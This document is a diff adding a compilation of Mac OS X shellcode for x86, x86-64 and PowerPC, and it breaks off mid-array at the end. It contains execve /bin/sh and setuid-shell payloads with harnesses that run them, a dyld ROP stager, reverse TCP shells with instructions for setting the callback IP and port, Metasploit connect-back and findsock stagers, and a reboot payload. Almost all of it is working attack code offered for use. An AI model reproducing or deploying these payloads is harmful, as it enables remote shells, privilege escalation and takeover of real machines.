@@ -1,0 +1,1350 @@
+/*
+Title : OSX/x86 intel - execve(/bin/sh) - 24 bytes
+Type : Shellcode
+Author : Simon Derouineau - simon.derouineau [AT] ingesup.com
+Platform : Mac OSX/Intel. Tested on 10.6.4 Build 10F569
+
+Informations : This code has to be compiled with gcc -m32 switch  on 10.6.0+
+
+More informations : x86-64 code is more secured than x86 code on OSX platform : 
+Canaries are added, Stack and heap are non-executable, etc.
+
+Also, cat /var/db/dyld/dyld_shared_cache_x86_64.map shows that no memory can be 
+mapped with WX flags, while it's possible with x86 code ( according to  /var/db/dyld/dyld_shared_cache_i386.map).
+
+The method used here is the easier one, heap is executable in x86 applications, 
+as described in "The Mac Hacker's Handbook", written by Charlie Miller.
+
+The trick is to memcopy the shellcode to the heap before executing it.
+
+*/
+
+
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <string.h>
+
+
+
+char shellcode[]= 	"\x31\xC0" 			// xor eax,eax
+			"\x50"				// push eax
+			"\x68\x2F\x2F\x73\x68"		// push dword
+			"\x68\x2F\x62\x69\x6E"		// push dword 
+			"\x89\xE3"			// mov ebx,esp
+			"\x50\x50\x53"			// push eax, push eax, push ebx
+			"\xB0\x3B"			// mov al,0x3b
+			"\x6A\x2A"			// push byte 0x2a
+			"\xCD\x80"			// int 0x80
+
+
+int main(int argc, char *argv[]){
+void (*f)(); 
+char *x = malloc(sizeof(shellcode));
+memcpy(x, shellcode, sizeof(shellcode));
+f = (void (*)()) x;
+f();
+}
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+; universal OSX dyld ROP shellcode
+; tested on OS X 10.6.8
+;
+; if you don't want to compile, copy stage0 code from precompiled.txt
+; and append your normal shellcode to it.
+;
+; usage:
+; - put your 'normal' shellcode in x64_shellcode.asm
+; - make
+; - ./sc
+;
+; if you want to test:
+; - uncomment lea rsp, [rel rop_stage0] / ret
+; - make
+; - nc -l 4444
+; - ./sc
+; - you should get a shell over nc
+;
+; see my blog, if you want to know how this works:
+; http://gdtr.wordpress.com
+;
+; greets to Jacob Hammack, for his reverse tcp shellcode (hammackj.com).
+;
+; pa_kt
+; twitter.com/pa_kt
+ 
+extern _printf
+ 
+global _main
+ 
+;--------------------------------------------------
+;- DATA
+;--------------------------------------------------
+section .data
+     
+rw_area     equ 0x00007FFF5FC50000
+rwx_area    equ rw_area+0x1000
+vm_prot     equ 0x00007FFF5FC0D356
+fake_stack  equ rw_area+0x2000
+fake_frame  equ fake_stack+0x100
+r12_zero    equ rw_area-0x1000
+ 
+rax_off     equ rw_area-8
+rbx_off     equ rw_area+8-8
+rcx_off     equ rw_area+0x10-8
+rdx_off     equ rw_area+0x18-8
+rsi_off     equ rw_area+0x28-8
+rbp_off     equ rw_area+0x30-8
+rsp_off     equ rw_area+0x38-8
+r8_off      equ rw_area+0x40-8
+r12_off     equ rw_area+0x60-8
+ 
+pop_rdi     equ 0x00007FFF5FC24CDC
+pop_rbx     equ 0x00007FFF5FC23373
+store_reg   equ 0x00007FFF5FC24CE1
+set_regs    equ 0x00007FFF5FC24CA1
+ 
+c_rwx       equ 7
+c_size      equ 0x1000
+c_addr      equ rwx_area
+c_set_max   equ 0
+ 
+dbg_ret     equ 0x00007FFF5FC24C4B
+ 
+; copy shellcode to RWX area
+; size = 0x1000
+stub:
+    lea rsi, [r15+saved_rsp_off+copy_stub_size+rop_post_size]
+    xor rcx, rcx
+    inc rcx
+    shl rcx, 12 ;rcx = 0x1000
+    lea rdi, [rel normal_shellcode]
+    rep movsb
+    ;int 3
+normal_shellcode:
+ 
+stub_size   equ $-stub
+ 
+            ; order is important
+rop_pre     dq  pop_rdi, rcx_off, pop_rbx, c_set_max, store_reg,
+            dq  pop_rdi, rdx_off, pop_rbx, c_size, store_reg,
+            dq  pop_rdi, rsi_off, pop_rbx, c_addr, store_reg,
+            dq  pop_rdi, rbp_off, pop_rbx, fake_frame, store_reg,
+            dq  pop_rdi, rsp_off, pop_rbx, fake_stack, store_reg,
+            dq  pop_rdi, r8_off, pop_rbx, c_rwx, store_reg,
+            dq  pop_rdi, r12_off, pop_rbx, r12_zero, store_reg,
+ 
+            ; set fake stack
+            dq  pop_rdi, fake_stack+8-8, pop_rbx, vm_prot, store_reg,
+             
+            ; set fake frame (return address -> rwx page)
+            dq  pop_rdi, fake_frame-8-0x38, store_reg,
+saved_rsp:
+            dq  pop_rdi, fake_frame+8-8, pop_rbx, rwx_area, store_reg,
+ 
+rop_pre_size    equ $-rop_pre           
+saved_rsp_off   equ $-saved_rsp-8
+ 
+rop_post    dq  dbg_ret
+             
+            ; set all regs and jump to vm_prot
+            dq  pop_rdi, rw_area, set_regs
+            ; marker
+            ; dq 0x1111111111111111
+ 
+rop_post_size   equ $-rop_post
+ 
+x64_shellcode:   incbin "x64_shellcode"
+x64_shellcode_size     equ $-x64_shellcode
+ 
+hello   db "test", 0
+fmt     db "\x%02x",0
+ 
+section .bss
+ 
+rop_stage0  resq    100
+copy_stub   resq    ((stub_size+7)/8)*5
+copy_stub_size  equ $-copy_stub
+ 
+;--------------------------------------------------   
+;- CODE
+;--------------------------------------------------
+section .text
+ 
+prep_stub:
+ 
+    mov     rcx, (stub_size+7)/8
+    mov     rsi, stub
+    mov     rdi, copy_stub
+    mov     rbx, rwx_area-8
+go:
+    mov     rax, pop_rdi
+    stosq
+    mov     rax, rbx
+    stosq
+    mov     rax, pop_rbx
+    stosq
+    movsq
+    mov     rax, store_reg
+    stosq
+    add     rbx, 8
+    loop    go
+    ret
+ 
+make_stage0:
+    mov     rsi, rop_pre
+    mov     rdi, rop_stage0
+    mov     rcx, rop_pre_size
+    rep     movsb
+     
+    mov     rsi, copy_stub
+    mov     rcx, copy_stub_size
+    rep     movsb
+ 
+    mov     rsi, rop_post
+    mov     rcx, rop_post_size
+    rep     movsb
+     
+    mov     rsi, x64_shellcode
+    mov     rcx, x64_shellcode_size
+    rep     movsb
+ 
+    ret
+ 
+print_it:
+    push    rbp
+    mov     rbp, rsp
+ 
+    mov     rcx, rop_pre_size + copy_stub_size + rop_post_size + x64_shellcode_size
+    lea     rsi, [rel rop_stage0]
+    xor     rax, rax
+one_char:
+    lodsb
+    push    rsi
+    push    rcx
+    mov     rsi, rax
+    mov     rdi, qword fmt
+    xor     rax, rax
+    call    _printf
+    pop     rcx
+    pop     rsi
+    loop    one_char
+     
+    leave
+    ret
+ 
+_main:
+    push    qword rbp
+    mov     rbp, rsp
+ 
+    call    prep_stub
+    call    make_stage0
+ 
+    call    print_it
+ 
+    ;lea     rsp, [rel rop_stage0]
+    ;ret
+ 
+    leave
+    ret
+ 
+; see http://t.co/nIrRbn5 for a detailed explanation
+; full package mirror: http://www.exploit-db.com/sploits/osx.rop.24072011.tgz
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;osx x64 reverse tcp shellcode (131 bytes)
+;Jacob Hammack
+;jacob.hammack@hammackj.com
+;http://www.hammackj.com
+;
+;props to http://www.thexploit.com/ for the blog posts on x64 osx asm
+;I borrowed some of his code
+;
+ 
+;#OSX reverse tcp shell (131 bytes)
+;#replace FFFFFFFF around byte 43 with the call back ip in hex
+;#replace 5C11 around byte 39 with a new port current is 4444
+;shellcode =
+;"\x41\xB0\x02\x49\xC1\xE0\x18\x49\x83\xC8\x61\x4C\x89\xC0\x48" +
+;"\x31\xD2\x48\x89\xD6\x48\xFF\xC6\x48\x89\xF7\x48\xFF\xC7\x0F" +
+;"\x05\x49\x89\xC4\x49\xBD\x01\x01\x11\x5C\xFF\xFF\xFF\xFF\x41" +
+;"\xB1\xFF\x4D\x29\xCD\x41\x55\x49\x89\xE5\x49\xFF\xC0\x4C\x89" +
+;"\xC0\x4C\x89\xE7\x4C\x89\xEE\x48\x83\xC2\x10\x0F\x05\x49\x83" +
+;"\xE8\x08\x48\x31\xF6\x4C\x89\xC0\x4C\x89\xE7\x0F\x05\x48\x83" +
+;"\xFE\x02\x48\xFF\xC6\x76\xEF\x49\x83\xE8\x1F\x4C\x89\xC0\x48" +
+;"\x31\xD2\x49\xBD\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x49\xC1\xED" +
+;"\x08\x41\x55\x48\x89\xE7\x48\x31\xF6\x0F\x05"
+ 
+;nasm -f macho reverse_tcp.s -o reverse_tcp.o
+;ld -o reverse_tcp -e start reverse_tcp.o
+ 
+BITS 64
+ 
+section .text
+global start
+ 
+start:
+  mov r8b, 0x02               ; unix class system calls = 2
+  shl r8, 24                  ; shift left 24 to the upper order bits
+  or r8, 0x61                 ; socket is 0x61
+  mov rax, r8                 ; put socket syscall # into rax
+ 
+;Socket
+  xor rdx, rdx                ; zero out rdx
+  mov rsi, rdx                ; AF_NET = 1
+  inc rsi                     ; rsi = AF_NET
+  mov rdi, rsi                ; SOCK_STREAM = 2
+  inc rdi                     ; rdi = SOCK_STREAM
+  syscall                     ; call socket(SOCK_STREAM, AF_NET, 0);
+ 
+  mov r12, rax                ; Save the socket
+ 
+;Sock_addr
+  mov r13, 0xFFFFFFFF5C110101 ; IP = FFFFFFFF, Port = 5C11(4444)
+  mov r9b, 0xFF               ; The sock_addr_in is + FF from where we need it
+  sub r13, r9                 ; So we sub 0xFF from it to get the correct value and avoid a null
+  push r13                    ; Push it on the stack
+  mov r13, rsp                ; Save the sock_addr_in into r13
+ 
+ 
+;Connect
+  inc r8                      ; Connect = 0x62, so we inc by one from the previous syscall
+  mov rax, r8                 ; move that into rax
+  mov rdi, r12                ; move the saved socket fd into rdi
+  mov rsi, r13                ; move the saved sock_addr_in into rsi
+  add rdx, 0x10               ; add 0x10 to rdx
+  syscall                     ; call connect(rdi, rsi, rdx)
+ 
+  sub r8, 0x8                 ; subtract 8 from r8 for the next syscall dup2 0x90
+  xor rsi, rsi                ; zero out rsi
+ 
+dup:
+  mov rax, r8                 ; move the syscall for dup2 into rax
+  mov rdi, r12                ; move the FD for the socket into rdi
+  syscall                     ; call dup2(rdi, rsi)
+ 
+  cmp rsi, 0x2                ; check to see if we are still under 2
+  inc rsi                     ; inc rsi
+  jbe dup                     ; jmp if less than 2
+ 
+  sub r8, 0x1F                ; setup the exec syscall at 0x3b
+  mov rax, r8                 ; move the syscall into rax
+ 
+;exec
+  xor rdx, rdx                ; zero out rdx
+  mov r13, 0x68732f6e69622fFF ; '/bin/sh' in hex
+  shr r13, 8                  ; shift right to create the null terminator
+  push r13                    ; push to the stack
+  mov rdi, rsp                ; move the command from the stack to rdi
+  xor rsi, rsi                ; zero out rsi
+  syscall                     ; call exec(rdi, 0, 0)
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * Title:     OSX/Intel - setuid shell x86_64 - 51 bytes
+ * Date:      2010-11-25
+ * Tested on: Mac OS X 10.6.5 - Darwin Kernel Version 10.5.0
+ * Author:    Dustin Schultz - twitter: @thexploit
+ *
+ * http://thexploit.com
+ *
+ * BITS 64
+ *
+ * section .text
+ * global start
+ *
+ * start:
+ * a:
+ *  mov r8b, 0x02          ; Unix class system calls = 2
+ *  shl r8, 24             ; shift left 24 to the upper order bits
+ *  or r8, 0x17            ; setuid = 23, or with class = 0x2000017
+ *  xor edi, edi           ; zero out edi
+ *  mov rax, r8            ; syscall number in rax
+ *  syscall                ; invoke kernel
+ *  jmp short c            ; jump to c
+ * b:
+ *  pop rdi                ; pop ret addr which = addr of /bin/sh
+ *  add r8, 0x24           ; execve = 59, 0x24+r8=0x200003b
+ *  mov rax, r8            ; syscall number in rax
+ *  xor rdx, rdx           ; zero out rdx
+ *  push rdx               ; null terminate rdi, pushed backwards
+ *  push rdi               ; push rdi = pointer to /bin/sh
+ *  mov rsi, rsp           ; pointer to null terminated /bin/sh string
+ *  syscall                ; invoke the kernel
+ * c:
+ *  call b                 ; call b, push ret of /bin/sh
+ *  db '/bin//sh'          ; /bin/sh string
+*/
+ 
+ 
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
+ 
+int (*sc)();
+ 
+char shellcode[] =
+"\x41\xb0\x02\x49\xc1\xe0\x18\x49\x83\xc8\x17\x31\xff\x4c\x89\xc0"
+"\x0f\x05\xeb\x12\x5f\x49\x83\xc0\x24\x4c\x89\xc0\x48\x31\xd2\x52"
+"\x57\x48\x89\xe6\x0f\x05\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f"
+"\x2f\x73\x68";
+ 
+int main(int argc, char **argv) {
+ 
+    void *ptr = mmap(0, 0x33, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
+            | MAP_PRIVATE, -1, 0);
+ 
+    if (ptr == MAP_FAILED) {
+        perror("mmap");
+        exit(-1);
+    }
+ 
+    memcpy(ptr, shellcode, sizeof(shellcode));
+    sc = ptr;
+ 
+    sc();
+ 
+    return 0;
+}
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * [MacOSX/PowerPC]
+ * Shellcode for: sync(), reboot()
+ * 32 bytes
+ * hophet [at] gmail.com
+ * http://www.nlabs.com.br/~hophet/
+ *
+ */
+
+#include "stdio.h"
+#include "string.h"
+
+char shellcode[] = 
+
+"\x7c\x63\x1a\x79"
+"\x39\x40\x01\x06"
+"\x38\x0a\xff\x1e"
+"\x44\xff\xff\x02"
+"\x60\x60\x60\x60"
+"\x39\x40\x01\x19"
+"\x38\x0a\xff\x1e"
+"\x44\xff\xff\x02";
+
+int main() {
+
+	void (*p)();
+	p = (void *)&shellcode;
+	printf("Lenght: %d\n", strlen(shellcode));
+	p();
+}
+
+/*
+.globl _main
+.text
+_main:
+	xor.	r3, r3,r3	// r3 = NULL
+	li	r10, 226+36
+	addi	r0, r10, -226	// r0 = 36
+	.long	0x44ffff02	// sc opcode
+	.long	0x60606060	// NOP
+	li	r10, 226+55
+	addi	r0, r10, -226	// r0 = 55
+	.long	0x44ffff02	// sc opcode 
+*/
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+ * [MacOSX/PowerPC]
+ * Shellcode for: execve("/bin/sh", ["/bin/sh"], NULL), exit()
+ * 72 bytes
+ * hophet [at] gmail.com
+ * http://www.nlabs.com.br/~hophet/
+ *
+ */
+
+#include "stdio.h"
+#include "string.h"
+
+char shellcode[] = 
+
+"\x7c\xa5\x2a\x79"
+"\x40\x82\xff\xfd"
+"\x7d\x68\x02\xa6"
+"\x3b\xeb\x01\x71"
+"\x39\x40\x01\x71"
+"\x39\x1f\xfe\xce"
+"\x7c\xa8\x29\xae"
+"\x38\x7f\xfe\xc7"
+"\x90\x61\xff\xf8"
+"\x90\xa1\xff\xfc"
+"\x38\x81\xff\xf8"
+"\x38\x0a\xfe\xca"
+"\x44\xff\xff\x02"
+"\x60\x60\x60\x60"
+"\x38\x0a\xfe\x90"
+"\x44\xff\xff\x02"
+"\x2f\x62\x69\x6e"
+"\x2f\x73\x68\x54";
+
+int main() {
+
+	void (*p)();
+	p = (void *)&shellcode;
+	printf("Lenght: %d\n", strlen(shellcode));
+	p();
+}
+/*
+.globl _main
+.text
+_main:
+        xor.    r5, r5, r5	// r5 = NULL
+        bnel    _main
+        mflr    r11
+        addi    r31, r11, 369
+        li      r10, 369
+        addi    r8, r31, -306
+        stbx    r5, r8, r5
+        addi    r3, r31, -313
+        stw     r3, -8(r1)	// [/bin/sh]
+        stw     r5, -4(r1)
+        subi    r4, r1, 8	// [/bin/sh]
+        addi    r0, r10, -310	// r0 = 59
+        .long   0x44ffff02	// sc opcode
+        .long	0x60606060	// NOP
+        addi    r0, r10, -368	// r0 = 1
+        .long   0x44ffff02	// sc opcode
+string:	.asciz	"/bin/shT"
+*/
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;;; $Id: ppc-execve.s,v 1.1 2003/03/01 01:10:48 ghandi Exp $
+;;; PPC MacOS X (maybe others) shellcode
+;;;
+;;; After assembly, change bytes 2 and 3 of the 'sc' instruction encoding
+;;; from 0x00 to 0xff.
+;;;
+;;; ghandi < ghandi@mindless.com >
+;;;
+	
+.globl _execve_binsh
+.text
+_execve_binsh:
+    	;; Don't branch, but do link.  This gives us the location of
+	;; our code.  Move the address into GPR 31.
+	xor.	r5, r5, r5	; r5 = NULL
+	bnel	_execve_binsh
+	mflr	r31
+
+	;; Use the magic offset constant 268 because it makes the
+        ;; instruction encodings null-byte free.
+	addi	r31, r31, 268+36
+	addi	r3, r31, -268	; r3 = path
+
+        ;; Create argv[] = {path, 0} in the "red zone" on the stack
+	stw	r3, -8(r1)	; argv[0] = path
+	stw	r5, -4(r1)	; argv[1] = NULL
+	subi	r4, r1, 8	; r4 = {path, 0}
+
+	;; 59 = 30209 >> 9    (trick to avoid null-bytes)
+	li	r30, 30209 
+	srawi	r0, r30, 9	; r0 = 59
+	sc			; execve(path, argv, NULL)
+path:   .asciz "/bin/sh"
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
+"\x7c\xa5\x2a\x79\x40\x82\xff\xfd\x7f\xe8\x02\xa6\x3b\xff\x07\xfa"
+"\x38\xa5\xf8\x4a\x3c\xc0\x28\x1a\x60\xc6\x7f\x0e\x38\x85\x07\xee"
+"\x7c\x89\x03\xa6\x80\x9f\xf8\x4a\x7c\x84\x32\x78\x90\x9f\xf8\x4a"
+"\x7c\x05\xf8\xac\x7c\xff\x04\xac\x7c\x05\xff\xac\x3b\xc5\x07\xba"
+"\x7f\xff\xf2\x15\x42\x20\xff\xe0\x4c\xff\x01\x2c\x10\x7a\x7f\x0c"
+"\x10\x9a\x7f\x0f\x10\xba\x7f\x08\x10\x1a\x7f\x6f\x6c\x1a\x7f\x0c"
+"\x54\x1a\x7d\x76\x54\x64\x64\x76\x60\x1a\x7f\x03\x28\x18\x60\x4e"
+"\x28\x1a\x7f\x0e\x54\x92\x7d\xa8\x10\xba\x7f\x1e\x10\x1a\x7f\x66"
+"\x57\xd9\x8c\x76\x6c\x1a\x7f\x0c\x54\x1a\x7d\x76\x10\x1a\x7f\x64"
+"\x57\xd9\x8c\x76\x6c\x1a\x7f\x0c\x54\x1a\x7d\x76\x57\xd9\x8c\x76"
+"\x10\x1a\x7f\x10\x10\x9a\x7f\x1e\xb8\x9b\x80\xe6\x10\xbb\x80\xe6"
+"\x10\x9b\x80\xfe\x6c\x1a\x7f\x0c\x54\x1a\x7d\x76\x54\x64\x64\x76"
+"\x10\xba\x7f\x0c\x10\x1a\x7f\x54\x57\xd9\x8c\x76\x54\xbe\x54\x76"
+"\x6c\x1a\x7f\x0c\x54\x1a\x7d\x76\x10\xbf\x80\xf1\x04\x1f\x80\xf1"
+"\x68\x98\x80\xeb\x10\x1a\x7f\x4c\x6c\x1a\x7f\x0c\x54\x1a\x7d\x76"
+"\x54\xbf\x55\x77\x68\x98\x80\xf3\x54\x72\x7d\xa8\x10\x79\x7f\x26"
+"\xb8\x7b\x80\xf6\xb8\xbb\x80\xf2\x10\x9b\x80\xf6\x10\x1a\x7f\x35"
+"\x54\x1a\x7b\xa2\x6c\x1a\x7f\x0c\x54\x1a\x7d\x76\x57\xfa\x7f\x06"
+"\x07\x78\x16\x60\x07\x79\x0c\x66\x28\x1a\x7f\x0e";
+
+
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;;
+;
+;        Name: stager_sock_reverse_nf.asm
+;   Qualities: Null-Free
+;   Platforms: MacOS X / PPC
+;     Authors: H D Moore < hdm [at] metasploit.com >
+;     Version: $Revision: 1.1 $
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Connects back, reads 8192 bytes, jumps into payload.
+;        Socket descriptor is left in r30.
+;
+;;
+
+
+.globl _main
+.text
+_main:
+
+_socket:	
+	li		r27, 0x3030 + 97
+	subi	r0, r27, 0x3030 + 97 - 97
+	subi	r3, r27, 0x3030 + 97 - 2
+	subi	r4, r27, 0x3030 + 97 - 1
+	subi	r5, r27, 0x3030 + 97 - 6
+
+	.long	0x44ffff02
+	xor		r5, r5, r5
+	mr		r30, r3
+
+_storeaddr:
+
+	; port - patch the xor word
+	li		r25, (0x2211^0x4142)
+	xori	r25, r25, 0x4142
+	subi	r29, r27, 0x3030 + 97 - 2
+	slwi	r29, r29, 16	
+	or		r29, r29, r25
+	stw		r29, -20(r1)
+
+	; addr - patch the xor dword
+	lis		r29, hi16(0x7f000001^0x01020304)
+	ori		r29, r29, lo16(0x7f000001^0x01020304)
+	lis		r28, hi16(0x01020304)
+	ori		r28, r28, lo16(0x01020304)
+	xor		r29, r29, r28
+	stw		r29, -16(r1)
+
+konnect:
+	la		r4, -20(r1)
+	subi	r5, r27, 0x3030 + 97 - 16
+	subi	r0, r27, 0x3030 + 97 - 98
+	mr		r3, r30
+	.long	0x44ffff02
+	xor		r5, r5, r5
+		
+reader:
+	li		r29, 0x3330
+	srawi	r29, r29, 12
+
+	subi	r0, r27, 0x3030 + 97 - 3
+	mr		r3, r30
+	subi	r4, r1, 8192+44
+	li		r5, 8192+44
+	mtctr	r4
+	.long	0x44ffff02
+	xor		r5, r5, r5
+	xor.	r5, r5, r5
+	blectr
+	xor		r5, r5, r5
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;;
+;
+;        Name: stager_sock_find
+;   Qualities: Can Have Nulls
+;   Platforms: MacOS X / PPC
+;     Authors: H D Moore < hdm [at] metasploit.com >
+;     Version: $Revision: 1.1 $
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        This payload will recv() downward until the read
+;        data contains the search tag (0xXXXX1337). Once the
+;        tag is located, it will jump into the payload.
+;
+;;
+
+.globl _main
+.text
+_main:
+	li 	r29, 0xfff
+	li	r30, 0xfff
+	addic.	r28, r29, -0xfff +1
+
+findsock:
+	subf.   r30, r28, r30
+	blt	_main
+
+	subi	r0, r29, 0xfff - 102
+	mr	r3, r30
+	subi	r4, r1, 4104
+	li 	r5, 4095
+	subi    r6, r29, 0xfff - 0x80
+	.long   0x44ffff02
+	xor.	r6, r6, r6
+	
+	lhz	r27, -4104(r1)
+	cmpwi	r27, 0x1337
+	bne	findsock
+
+gotsock:
+	subi	r4, r1, 4100
+	mtctr	r4
+	blectr	
+	xor.	r6, r6, r6
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;;
+;
+;        Name: stager_sock_find_peek
+;   Qualities: Null-Free
+;   Platforms: MacOS X / PPC
+;     Authors: H D Moore < hdm [at] metasploit.com >
+;     Version: $Revision: 1.1 $
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        This payload will recv() downward until the read
+;        data contains the search tag (0xXXXX1337). Once the
+;        tag is located, it will jump into the payload. The
+;        recv() call is passed the MSG_PEEK flag, the stage
+;        will need to flush the recv() queue before doing
+;        something like dup2'ing a shell.
+;
+;;
+
+.globl _main
+.text
+_main:
+	li		r29, 0xfff
+	li		r30, 0xfff
+	addic.	r28, r29, -0xfff +1
+
+findsock:
+	subf.   r30, r28, r30
+	blt		_main
+
+	subi	r0, r29, 0xfff - 102
+	mr		r3, r30
+	subi	r4, r1, 4104
+	li		r5, 4095
+	subi	r6, r29, 0xfff - 0x82
+	.long	0x44ffff02
+	xor.	r6, r6, r6
+	
+	lhz		r27, -4104(r1)
+	cmpwi	r27, 0x1337
+	bne		findsock
+
+gotsock:
+	subi	r4, r1, 4100
+	mtctr	r4
+	blectr	
+	xor.	r6, r6, r6
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;;
+;
+;        Name: single_reverse_tcp
+;   Qualities: Can Have Nulls
+;   Platforms: MacOS X / PPC
+;     Authors: H D Moore < hdm [at] metasploit.com >
+;     Version: $Revision: 1.1 $
+;     License:
+;
+;        This file is part of the Metasploit Exploit Framework
+;        and is subject to the same licenses and copyrights as
+;        the rest of this package.
+;
+; Description:
+;
+;        Connect back and spawn a shell
+;
+;
+;;
+
+.globl _main
+.text
+_main:
+	;; socket
+	li      r3, 2
+    li      r4, 1
+    li      r5, 6
+    li      r0, 97
+    sc
+    xor     r0, r0, r0
+    mr      r30, r3
+
+    bl		_connect
+    .long 	0x00022211
+    .long 	0x7f000001
+
+_connect:
+    mflr    r4
+    li      r5, 0x10
+    li      r0, 98
+    mr      r3, r30
+    sc
+	xor.	r5, r5, r5
+
+_setup_dup2:
+	li      r5, 2
+
+_dup2:
+    li      r0, 90
+    mr      r3, r30
+    mr      r4, r5
+    sc
+    xor     r0, r0, r0
+    subi    r5, r5, 1
+    cmpwi   r5, -1
+    bnel    _dup2
+
+_fork:
+    li      r0, 2
+    sc
+	xor.	r5, r5, r5
+
+_execsh:
+    xor.    r5, r5, r5
+    bnel    _execsh
+    mflr    r3
+    addi    r3, r3, 28
+    stw     r3, -8(r1)      ; argv[0] = path
+    stw     r5, -4(r1)      ; argv[1] = NULL
+    subi    r4, r1, 8       ; r4 = {path, 0}
+    li      r0, 59
+    sc                      ; execve(path, argv, NULL)
+
+; csh removes the need for setuid()
+path:
+	.ascii  "/bin/csh"
+	.long   0x00414243
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+;;;
+;;; PowerPC OSX remote findsock by recv() key shellcode
+;;;
+;;; Dino Dai Zovi < ddz@theta44.org >, 20040816
+;;;
+
+.globl _shellcode
+.text
+
+.set KEY, 0x5858580a
+.set PTHREAD_EXIT, 0x90017021	; OSX 10.3.X
+
+_shellcode:
+Lfindsock:
+	addis	r27, 0, hi16(KEY)
+	ori	r27, r27, lo16(KEY)
+	addis	r31, 0, hi16(0xffff0000)
+	srawi	r31, r31, 11
+	mtctr	r31
+
+	;; Count down sockets backwards in hopes of getting our most recent
+	;; connection (if we have multiple).
+L0:	mfctr	r3
+	addi	r3, r3, -1	; r3 = socket file descriptor
+
+	addi	r4, r1, -4	; r4 = stack buffer
+	sub	r5, r1, r4	; r5 = 4
+	li	r6, 0x4140
+	srawi	r6, r6, 7	; r6 = MSG_PEEK | MSG_DONTWAIT
+	addi	r7, r5, -4	; r7 = 0
+	addi	r8, r5, -4	; r8 = 0
+	li	r30, 0x3aff
+	srawi	r0, r30, 9	; load syscall number into r0
+	cmplw	r29, r29
+
+	.long	0x44ffff02	; recvfrom(s, buf, 4, 0x82, 0, 0)
+	bdnzt	eq, L0
+	;; On syscall error, attempt compare anyway and loop
+	
+	lwz	r28, -4(r1)
+	cmplw	r28, r27
+	bdnzf	eq, L0
+	;;; At this point our socket fd is in ctr
+
+;;;
+;;; dup2(2) our socket (in ctr) to stdin, stdout, stderr
+;;; 	
+Ldup_fds:
+	li	r30, 0x2d01
+	srawi	r0, r30, 7
+	li	r30, 0x666
+	srawi	r30, r30, 9
+	
+	mfctr	r3
+	addi	r4, r30, -1
+	.long	0x44ffff02	; dup2(sock, 2)
+	.long	0x7c842008
+	
+	mfctr	r3
+	addi	r4, r30, -2
+	.long	0x44ffff02	; dup2(sock, 1)
+	.long	0x7c842008	
+	
+	mfctr	r3
+	addi	r4, r30, -3
+	.long	0x44ffff02	; dup2(sock, 0)
+	.long	0x7c842008
+
+;;;
+;;; VForking shellcode - Call vfork() and execute /bin/sh in child process.  
+;;; In parent, we exec "/bin/si" ("/bin/sh" + 1), fail, and run the code that 
+;;; follows the execve().
+;;;
+Lfork_execve_binsh:
+        ;; call vfork (necessary to exec in threaded programs)
+	li	r30, 0x42ff
+	srawi	r0, r30, 8 
+	.long	0x44ffff02
+	.long	0x7c842008
+
+ 	xor	r31, r31, r31
+ 	lis	r30, 0x2f2f
+ 	addi	r30, r30, 0x7367
+	add	r30, r30, r4	; In child, $r4 should be zero
+ 	lis	r29, 0x2f62
+ 	addi	r29, r29, 0x696e
+	xor	r28, r28, r28
+	addi	r27, r1, -12
+ 	stmw	r27, -12(r1)	; -12 is arbitrary null-eliding constant
+
+ 	addi	r4, r1, -12
+	addi	r3, r1, -4
+ 	xor	r5, r5, r5
+ 	li	r30, 30209
+ 	srawi	r0, r30, 9	; r0 = 59
+ 	.long	0x44ffff02	; execve(path, argv, NULL)
+Lparent:
+
+;;;
+;;; Call pthread_exit in parent process
+;;;
+Lpthexit:
+	addis	r31, 0, hi16(PTHREAD_EXIT) ; pthread_exit
+	ori	r31, r31, lo16(PTHREAD_EXIT)
+	mtctr	r31
+	bctrl
+
+
+
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*
+PPC OSX/Darwin Shellcode by B-r00t. 2003.
+Does open(); write(); close(); exit();
+See ASM below.
+122 Bytes.
+*/
+
+char shellcode[] =
+"\x7c\xa5\x2a\x79\x40\x82\xff\xfd"
+"\x7f\xe8\x02\xa6\x39\x1f\x01\x71"
+"\x39\x08\xfe\xf4\x7c\xa8\x29\xae"
+"\x38\x7f\x01\x68\x38\x63\xfe\xf4"
+"\x38\x80\x02\x01\x38\xa0\xff\xff"
+"\x39\x40\x01\x70\x38\x0a\xfe\x95"
+"\x44\xff\xff\x02\x60\x60\x60\x60"
+"\x38\x9f\x01\x72\x38\x84\xfe\xf4"
